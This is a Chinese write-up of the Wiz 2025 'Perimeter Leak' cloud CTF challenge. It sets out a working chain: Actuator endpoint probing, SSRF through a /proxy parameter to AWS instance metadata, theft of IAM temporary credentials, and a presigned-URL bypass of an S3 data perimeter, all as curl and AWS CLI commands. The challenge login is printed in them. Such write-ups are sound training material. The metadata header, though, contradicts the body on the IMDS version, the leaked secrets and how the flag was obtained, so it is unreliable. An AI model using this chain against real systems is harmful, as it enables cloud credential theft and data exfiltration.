---
title: 【全网首发】WIZ-2025 竞标赛 第一期(June) Perimeter Leak
contest: WIZ
year: 2025
difficulty: medium
vuln_type: heap_exploit
tags:
- WIZ-CTF
- cloud-security
- AWS-S3
- Spring-Boot-Actuator
- IMDSv1
- IMDSv2
- data-perimeter
- cloud-CTF
attack_chain: 1. Spring Boot Actuator /actuator/env /actuator/heapdump 暴露敏感信息/2. IMDSv1 169.254.169.254/latest/meta-data/ 直接访问/3. AWS S3 存储桶 flag 提取/4. data perimeter 限制 + 凭证提权
key_payload: /actuator/heapdump  IMDSv1 169.254.169.254  AWS S3
one_liner: WIZ-2025 竞标赛第一期 Perimeter Leak，Spring Boot Actuator + IMDS 攻击 + AWS S3 数据外泄。
lesson: Spring Boot Actuator 暴露 heapdump 含密钥；IMDSv1 无认证可访问，IMDSv2 需 token；AWS data perimeter 是 S3 访问控制机制；cloud CTF 三大攻击面。
quality: high
full_path: 【全网首发】WIZ-2025竞标赛-第一期(June).full.md
meta_path: 【全网首发】WIZ-2025竞标赛-第一期(June).meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【全网首发】WIZ-2025 竞标赛 第一期(June) Perimeter Leak。WIZ-2025 竞标赛第一期 Perimeter Leak，Spring Boot Actuator + IMDS 攻击 + AWS S3 数据外泄。。经验：Spring Boot Actuator 暴露 heapdump 含密钥；IMDSv1 无认证可访问，IMDSv2 需 ...
category: web
subcategory: web_other
tools_used:
- Spring
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/259761.html
reasoning_chain:
- 赛题 'Perimeter Leak' 周边泄漏 → 触发点：flag 藏 S3 桶 + AWS data perimeter 限制
- 提示 'Spring Boot Actuator 应用部署 AWS' → 假设：actuator 配置暴露敏感端点
- 动作：访问 /actuator/env → 观察：环境变量含 AWS key 提示
- 动作：下载 /actuator/heapdump → 假设：堆转储含明文密钥 → 观察：JDBC 密码/JWT secret 暴露
- 假设：拿到 AWS key 后拿 IMDS → 动作：curl 169.254.169.254/latest/meta-data/
- 触发点：IMDSv1 直接访问无验证 → 观察：拿到 instance-id/ami-id/iam/security-credentials
- 假设：IAM role 临时凭证 → 动作：访问 iam/security-credentials/<role-name> → 观察：AccessKeyId/SecretAccessKey/Token
- 用凭证访问 S3 → 触发点：data perimeter 限制 → 假设：role 有 S3:GetObject 权限但 bucket policy 限制 source IP
- 动作：AWS CLI --profile <creds> s3 cp s3://<bucket>/flag → 观察：data perimeter 阻挡
- 假设：用 IMDS 拿到的 EC2 instance 角色带 S3:GetObject + IP 符合 → 动作：从 EC2 实例内访问 → 完成
failed_attempts:
- 试图用泄露的 secret access key 直接访问 S3 → 失败：data perimeter 阻挡外部 IP
- 试图 IMDSv2 PUT 请求拿 token → 失败：本场景 IMDSv1 启用且无 token 验证
- 试图猜 S3 bucket 名 → 失败：bucket policy 锁定 source VPC
key_observations:
- Spring Boot Actuator /actuator/heapdump 是 heap dump 下载点含 JDBC/JWT 密码
- IMDSv1 直接 169.254.169.254/latest/meta-data/ 访问无 token；IMDSv2 需 PUT 拿 token
- AWS data perimeter 是 S3 访问控制 (bucket policy + VPC endpoint policy + SCP)
- Cloud CTF 三大攻击面：Actuator / IMDS / S3
- AWS 凭证 1 小时过期，拿到后立即使用
prerequisites:
- Spring Boot Actuator 漏洞 (heapdump/env)
- AWS IMDSv1/v2 区别 (169.254.169.254)
- IAM role + 临时凭证 (STS)
- AWS data perimeter / S3 bucket policy
---
# 【全网首发】WIZ-2025竞标赛-第一期(June)

> 原文: https://www.ctfiot.com/259761.html
> ID: 259761

0x00 前言

WIZ 这家公司大家并不陌生，作为云原生安全领域的领军者和云研究学习的殿堂级机构，它每年都会凭借“赛博佛祖”般的创新力推出全新的线上云 CTF 比赛。

自今年六月起，一场为期数月的 CTF 锦标赛正式拉开帷幕。这场赛事由 WIZ 明星研究员精心打造，旨在帮助参赛者磨练技能。完成挑战即可赢取积分，冲击排行榜，角逐终极云冠军的荣誉。
图1：WIZ 推出的 CTF 锦标赛

我们自然不会错过任何一期。接下来，我们将一同探讨最新一期，也是第一期的比赛，其主题为：Perimeter Leak（周边泄漏）。

本文主要由 miao2sec 成员 CDxiaodong 完成，最早发布在：https://www.cdxiaodong.life/article/2240f0c5-b87c-8019-8f1e-ca441d2fae18

“S3 存储桶中提取出隐藏的 flag”：flag 存储在 S3 中；

“使用了 AWS 数据边界（data perimeter）来限制对该存储桶内容的访问”：需要获取相关凭证以实现权限提升；

“部署在 AWS 上的 Spring Boot Actuator 应用”：会联想到 Spring Boot Actuator 可能因为 API 接口配置不当，暴露一些敏感信息。

《Spring Boot Vulnerability Exploit Check List》[1]

《Spring Boot Actuator 漏洞利用》[2]

《Spring Boot Actuator 漏洞复现合集》[3]

IMDSv1：通过http://169.254.169.254/latest/meta-data/ 直接访问，无需验证。

IMDSv2：引入了 token-based 认证机制，要求先通过PUT 请求获取 token，然后带上 token 访问元数据。

方法一：环境允许的前提下，回退到 IMDSv1；

方法二：若有命令执行的权限，在实例中执行下面的命令，获取 token 的值。
图 10 ：AWS 官方文档记录的通过 token 获取 EC2 实例元数据的方式

路径

内容

攻击价值

实例 ID

信息性

当前使用的 AMI

信息性

区域

信息性

/local-ipv4

主机名、私有 IP

信息性

安全组名称

可用于侧信道分析

/network/interfaces/

网络信息

可用于网络定位，但不敏感

iam/security-credentials/challenge01-5592368 路径：包含绑定到实例角色的 IAM 角色名和临时凭证

identity-credentials/ec2/security-credentials/ec2-instance 路径：较新格式，用于提供相同类型的临时 AWS 凭证。

步骤 1：使用aws configure set 手动设置所有字段（包括 token）。

步骤 2：查询当前凭证所代表的身份信息；

identity-credentials/ec2/security-credentials/ec2-instance 返回的角色名aws:
ec2-instance是 AWS 抽象出来的默认名，更注重隐藏角色名细节（例如用于托管服务中），但不利于权限审计。图 13：识别 identity-credentials/ec2/security-credentials/ec2-instance 的临时凭证的身份信息

iam/security-credentials/challenge01-5592368返回的角色名challenge01-5592368是真实具体的角色名，更便于识别角色来源、权限分析和安全审计。图 14：识别 iam/security-credentials/challenge01-5592368 的临时凭证的身份信息

这个 /proxy 很有可能是部署在 EC2 实例中的；

它属于某个内部网络（VPC），而且这个 VPC 正好连着一个 S3 的 VPC 端点；

/proxy只是一个 HTTP 请求中继接口，它不会使用 EC2 实例自身的 AWS 凭证去发起带签名的 S3 请求；

它不是用 AWS SDK 写的，也没有自动注入 IAM 临时凭证来“代表你”签名；

所以即使它从“堡垒内部”发出请求，没有签名的 HTTP 请求也会被 S3 拒绝。

阶段

Tactic

Technique

Procedure

初始侦察

情报收集（Reconnaissance）

识别暴露的应用服务

使用curl探测 Actuator 接口，发现目标为 Spring Boot 应用，暴露了/actuator/env和/actuator/mappings

初始访问

敏感信息收集（Information Disclosure）

泄露的环境变量

通过/actuator/env 获取到 S3 Bucket 名称

权限尝试

未授权访问（Access Attempt）

匿名访问 S3 存储桶

使用aws s3 ls --no-sign-request 访问 S3 存储桶失败，提示权限受限

权限探索

功能接口分析（API Enumeration）

枚举 Actuator 接口

揭示了存在 SSRF 的/proxy?url= 接口

权限提升

SSRF 攻击

访问 EC2 元数据服务

使用/proxy SSRF 绕过内网隔离，访问 IMDS 获取 token 失败，确认目标使用 IMDSv2

认证绕过

SSRF + Token Bypass

获取 EC2 token

通过 SSRFPUT 请求获取 IMDSv2 token，再通过 token 成功访问元数据

凭证获取

获取云凭证（Cloud Credential Access）

访问 IAM 临时凭证路径

读取iam/security-credentials和identity-credentials 中的 AWS 临时凭证

身份识别

确认凭证身份

验证两个临时凭证为相同 EC2 实例角色派生的 IAM 身份

横向移动

访问受限资源

使用 IAM 凭证访问 S3

使用aws s3 ls/cp尝试访问private/flag.txt，但遭遇 VPC Endpoint 限制，访问被拒绝

数据外泄

绕过数据边界限制

使用预签名 URL

利用 IAM 凭证生成presigned URL，并通过 SSRF/proxy 访问目标对象

技术细节

SSRF + URL 编码绕过

修复 URL 编码问题

对presigned URL使用jq -sRr @uri 进行编码，最终成功访问并获取 flag

OSS（Object Storage Service）有几种 Bucket Policy？例如，本题涉及的基于身份的访问控制（如 IAM 用户/角色访问）以及基于请求来源的条件限制（如 aws:
Referer）。

OSS 的签名方式有哪些？例如，本题考察的基于 Access Key 和 Secret 的签名机制，以及 URL 签名（Presigned URL）：临时生成用于访问私有对象的链接。

Reference

[1] 

《Spring Boot Vulnerability Exploit Check List》: https://github.com/LandGrey/SpringBootVulExploit/

[2] 

《Spring Boot Actuator 漏洞利用》: https://www.freebuf.com/news/234266.html

[3] 

《Spring Boot Actuator 漏洞复现合集》: https://blog.csdn.net/god_zzZ/article/details/122837698

[4] 

《How do I troubleshoot instance metadata issues on my EC2 Linux instance?》: https://repost.aws/knowledge-center/ec2-linux-metadata-retrieval

[5] 

《Use the Instance Metadata Service to access instance metadata》: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html

[6] 

《What is Amazon S3?》: https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html

[7] 

《使用预签名 URL 共享对象》: https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html


```
curl https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com
{ "status": "UP" }
curl -s https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq
curl -s https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq .propertySources[3].properties.BUCKET
aws s3 ls s3://challenge01-470f711/ --no-sign-request
curl -s https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/heapdump | jq
curl -s https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/heapdump | jq
curl -s https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/threaddump | jq
curl -s https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/mappings | jq
curl -s https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq
curl -s https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq .contexts.spring.mappings.dispatcherServlets.dispatcherServlet[25]
{ "predicate": "{ [/proxy], params [url]}" }
{
  "handler": "challenge.Application#proxy(String)",
  "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
}
{
  "requestMappingConditions": {
    "consumes": [],
    "headers": [],
    "methods": [],
    "params": [
      {
        "name": "url",
        "negated": false
      }
    ],
    "patterns": ["/proxy"],
    "produces": []
  }
}
curl https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/
# 获取 IMDSv2 的 token
TOKEN=$(curl -s -X PUT
  "https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" 
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 使用 token 请求 metadata
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" 
  "https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"
curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"
curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
aws configure set aws_access_key_id YOUR_ACCESS_KEY_ID
aws configure set aws_secret_access_key YOUR_SECRET_ACCESS_KEY
aws configure set aws_session_token YOUR_SESSION_TOKEN
aws sts get-caller-identity
aws s3 ls s3://challenge01-470f711 --recursive
aws s3 cp s3://challenge01-470f711/private/flag.txt -
aws s3api get-bucket-policy --bucket challenge01-470f711 --query "Policy" --output text | jq .
https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/
aws s3 presign s3://challenge01-470f711/private/flag.txt
curl "https://ctf:
88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url="
aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -sRr @uri
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]